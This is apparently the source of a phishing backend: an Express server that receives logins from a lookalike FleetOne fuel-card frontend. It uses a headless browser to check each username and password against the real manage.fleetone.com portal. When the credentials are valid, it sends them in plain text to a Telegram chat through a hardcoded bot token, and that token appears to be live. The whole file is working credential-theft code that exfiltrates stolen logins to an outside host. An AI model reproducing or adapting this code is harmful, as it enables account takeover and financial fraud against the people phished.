const express = require("express");
const puppeteer = require("puppeteer");
// const { chromium } = require("playwright");
const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
const port = 8080;

const corsOptions = {
  origin: "https://fleet-one-frontend.vercel.app",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  credentials: true,
};

// app.use(
//   cors({
//     origin: "https://fleet-one-frontend.vercel.app", // Укажите URL вашего фронтенда
//     methods: ["GET", "POST", "PUT", "DELETE"],
//   })
// );

app.use(cors());

app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM";
const CHAT_ID = 531918242;

app.get("/", (req, res) => {
  res.send("Hello");
});

app.post("/login", async (req, res) => {
  res.setHeader(
    "Access-Control-Allow-Origin",
    "https://fleet-one-frontend.vercel.app"
  );
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:3000");

  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: "Missing username or password" });
  }

  const browser = await puppeteer.launch({ headless: true }); // true i depqum usery chi tenum
  const page = await browser.newPage();

  try {
    await page.goto("https://manage.fleetone.com/security/fleetOneLogin", {
      waitUntil: "networkidle2",
    });

    await page.type('input[name="userId"]', username);
    await page.type('input[name="password"]', password);
    await page.evaluate(() => {
      document.querySelector("form").submit();
    });
    console.log("Submitting form...");
    // await page.click('form button[type="submit"]');

    await new Promise((r) => setTimeout(r, 5000));

    const loginError = await page.$(".errors");
    if (loginError) {
      await browser.close();
      return res.json({ success: false, message: "Invalid credentials" });
    }

    const isLoggedIn = await page.evaluate(() => {
      return document.querySelector("#pad") !== null;
    });

    if (!isLoggedIn) {
      await browser.close();
      return res.json({ success: false, message: "Login failed" });
    }
    if (isLoggedIn) {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=-1002614062462`;
      const telegramMessage = {
        chat_id: CHAT_ID,
        text: `✅ Новый логин:\n👤 Username: ${username}\n🔑 Password: ${password}`,
      };

      try {
        await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(telegramMessage),
        });
      } catch (error) {
        console.error("Error Telegram:", error);
      }

      return res.json({
        success: true,
        message: "Login successful",
        username,
        password,
      });
    }

    await browser.close();
    return res.json({ success: true, message: "Login successful" });
  } catch (error) {
    await browser.close();
    res
      .status(500)
      .json({ error: "Login process failed", details: error.message });
  }
});

app.listen(port, () => {
  console.log(`Backend server is running at http://localhost:${port}`);
});

module.exports = app;
